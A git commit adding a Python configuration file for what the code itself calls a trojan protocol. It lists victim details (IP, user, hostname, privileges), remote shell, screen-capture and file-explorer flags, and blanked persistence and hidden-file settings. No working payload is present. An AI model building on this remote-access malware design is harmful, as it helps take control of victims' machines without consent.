4a115e92a14babb19b9cbb410d75b26ec67b9eb7
Avraham sabann <66841899+albertmonamor@users.noreply.github.com>
2023-09-12 02:09:19 +0300

    Create protocol.py

---
+++ Api/protocol.py
@@ -0,0 +1,38 @@
+import base64
+import os
+import sys
+
+# /** PYTHON **/
+
+PACKET_TROJAN_PROTOCOL:dict = {
+    ""       : '',        # key hidden
+    "ip"            : "",
+    "recv"          : 0,
+    "port"          : 0,
+    "user"          : "",
+    "hostname"      : "",
+    ""      : "",        # key hidden
+    "priv"          : "",
+    "versionos"     : "",
+    ""       : "",        # key hidden
+    ""    : "",           # key hidden
+    'xor'           : b"",
+    'block_stream'  : False,
+    'screen'        : 1,
+    'shell'         : 1,
+    'explorer'      : 1,
+    'ping'          : 1,
+    'streamer'      : 1,
+    'scanner'       : 1,
+    'shell-ter'     : 0,
+}
+
+OK = "" # // value not here
+
+NOOD_PATH     = f"" # // value not here
+NOOD_NAME     = sys.argv[0]
+H_T_NAME      = str() # // value not here
+startup_keys  = base64.b64decode("").decode() # // value not here
+hidden_files  = base64.b64decode("").decode() # // value not here
+BLOCK_FRM     = b"" # // hidden
+SUM_BLOCKS    = 3
